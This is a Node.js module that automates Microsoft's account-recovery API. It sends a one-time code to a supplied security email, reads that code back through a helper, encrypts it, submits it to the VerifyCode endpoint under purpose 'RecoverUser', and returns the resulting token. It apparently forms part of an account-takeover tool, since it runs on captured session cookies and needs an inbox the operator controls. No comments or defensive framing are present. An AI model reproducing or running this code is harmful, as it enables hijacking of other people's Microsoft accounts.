const axios = require('axios');
const { queryParams } = require('../../../db/db');
const extractCode = require('./extractCode');
const encryptOtt = require('./encryptOtt');
const decode = require('./decode');

module.exports = async (amrp, amsc, apicanary, securityEmail, epid, token) => {
 let data = await axios({
  method: "POST",
  url: "https://account.live.com/API/Proofs/SendOtt",
  headers: {
   Cookie: `AMRPSSecAuth=${amrp}; amsc=${amsc}`,
   canary: apicanary,
   "Content-Type": `application/json`,
  },
  data: {
   associationType: "Proof",
   confirmProof: securityEmail,
   epid: epid,
   hpgid: 200708,
   proofRequiredReentry: 1,
   purpose: "RecoverUser",
   scid: 100103,
   token: token,
   uiflvr: 1001,
  },
 });
 if (data?.data?.error) {
  return false
 }
 let code = await extractCode(securityEmail);
 let encryptedOtt = encryptOtt(code);
 let verificationData = await axios({
  method: "POST",
  url: "https://account.live.com/API/Proofs/VerifyCode",
  headers: {
   Cookie: `AMRPSSecAuth=${amrp};amsc=${amsc}`,
   canary: apicanary,
   "Content-Type": `application/json`,
  },
  data: {
   action: "OTC",
   confirmProof: securityEmail,
   encryptedCode: encryptedOtt,
   epid: epid,
   hpgid: 200285,
   proofRequiredReentry: 1,
   publicKey: "25CE4D96CB3A09A69CD847C69FC6D40AF4A4DE12",
   purpose: "RecoverUser",
   scid: 100103,
   token: token,
   uaid: "985d9ef8f4d240e0b143cdcdb01b0688",
   uiflvr: 1001,
  },
 });
 if (verificationData?.data?.token) {
  return decode(verificationData.data.token);

 } else {
  return false
 }
}